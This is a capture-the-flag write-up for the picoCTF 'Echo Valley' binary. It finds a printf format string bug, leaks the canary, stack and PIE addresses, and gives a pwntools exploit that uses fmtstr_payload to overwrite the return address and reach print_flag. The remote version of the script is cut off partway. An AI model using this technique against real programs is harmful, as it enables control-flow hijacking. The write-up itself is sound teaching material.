Analysis

I did not use the source code to analyze the binary. I personally feel like that’s cheating, and I never allow myself to look at the source. I try to reason through the binary and the decompiled output as best I can.

Checking the binary

First thing I do is run checksec.

(pwn) eric@Eric:~/pico/valley$ checksec valley
[*] '/home/eric/pico/valley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes

Every protection is enabled. Full RELRO immediately rules out any kind of GOT overwrite. Running the program normally, it’s just an echo program that prints back whatever you give it.

Finding the vulnerability

To test for a format string bug, I sent %p and got an address back.

(pwn) eric@Eric:~/pico/valley$ ./valley
Welcome to the Echo Valley, Try Shouting: 
AAAAAAAAAAAAAAAAAAAAAAAAAAA
You heard in the distance: AAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You heard in the distance: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
%p
You heard in the distance: 0x7fff1de767a0

That confirms a format string vulnerability. At this point, we can leak pretty much anything that’s on the stack. A stack address, a PIE address, or the canary if it’s in range. Here’s what I found:

  • %19$p leaks the stack canary

  • %20$p leaks a stack address 8 bytes away from the return address

  • %21$p leaks the return address to main

Verifying with GDB

To confirm all of this, I ran the program in GDB and set a breakpoint at the return.

b *echo_valley+249
r

Then I sent the payload:

%19$p %20$p %21$p

Output:

0x66fb8142a5b10300 0x7fffffffdd50 0x555555555413

I stopped execution and inspected the stack.

───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7d1ba91 → __GI___libc_read(...)
[#6] 0x555555555358 → echo_valley()
[#7] 0x555555555413 → main()

gef➤ canary

The leaked canary matches exactly. After continuing execution and exiting normally, I checked the stack pointer.

$rsp   : 0x7fffffffdd48 → 0x555555555413 → <main+12>

The %20$p leak gave 0x7fffffffdd50, which is exactly 8 bytes away from the return address. Everything lines up perfectly.

Looking at the decompiled code

With the leaks confirmed, I opened the binary in Ghidra. This is the core logic of the program. main calls this function, and when it returns, the program exits.

void echo_valley(void)
{
  long canary;
  char buf[100];

  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the Echo Valley, Try Shouting: ");

  while (1) {
    fflush(stdout);
    if (!fgets(buf, 100, stdin)) {
      puts("\nEOF detected. Exiting...");
      exit(0);
    }

    if (strcmp(buf, "exit\n") == 0)
      break;

    printf("You heard in the distance: ");
    printf(buf);
    fflush(stdout);
  }

  puts("The Valley Disappears");
  fflush(stdout);

  if (canary != *(long *)(in_FS_OFFSET + 0x28))
    __stack_chk_fail();
}

There is also a print_flag function that is never called.

void print_flag(void)
{
  FILE *file;
  char buf[32];

  file = fopen("/home/valley/flag.txt","r");
  if (!file) {
    perror("Failed to open flag file");
    exit(1);
  }

  fgets(buf, 0x20, file);
  printf("Congrats! Here is your flag: %s", buf);
  fclose(file);
  exit(0);
}

Exploitation strategy

There is no buffer overflow here. fgets is bounded correctly, so the stack canary is irrelevant. The only way to gain control flow is via the format string vulnerability, specifically using %n to write to memory. The plan is simple:

  1. Leak the runtime PIE address of main

  2. Calculate the runtime address of print_flag

  3. Leak the stack address

  4. Overwrite the saved return address using %n

Offsets from the binary:

  • main offset: 0x1401

  • print_flag offset: 0x1269

That gives a difference of 0x198.

The last step is to find out where our input lives in the printf arguments.

I found this out by sending a bunch of %p’s and on the 6th leak we start seeing our input. We need that information for the format string payload to figure out where we can write to.

Local exploit

I tested everything locally first to make sure the math and writes were correct.

from pwn import *

context.arch = 'amd64'
#p = remote('shape-facility.picoctf.net', 54473)
p = process('./valley')

p.sendline(b'%21$p')
p.recvuntil(b'You heard in the distance: ')
main_leak = int(p.recvline().strip(), 16)
log.success(f'main_leak: {hex(main_leak)}')

print_flag = main_leak - 0x198 - 0x12
log.success(f'print_flag: {hex(print_flag)}')

p.sendline(b'%20$p')
p.recvuntil(b'You heard in the distance: ')
stack_leak = int(p.recvline().strip(), 16)
log.success(f'stack_leak: {hex(stack_leak)}')

ret_addr = stack_leak - 0x8
log.success(f'ret_addr: {hex(ret_addr)}')

payload = fmtstr_payload(
    offset=6,
    writes={ret_addr: print_flag},
    write_size='short'
)

p.sendline(payload)
p.sendline(b'exit')
p.interactive()

Output:

The Valley Disappears
Failed to open flag file: No such file or directory

Control flow was successfully redirected to print_flag.

Remote exploit

Swapping the local process for the remote one gives us the flag.

from pwn import *

context.arch = 'amd64'

p = remote('shape-facility.picoctf.net', 54473)

p.sendline(b'%21$p')
p.recvuntil(b'You heard in the distance: ')
main_leak = int(p.recvline().strip(), 16)
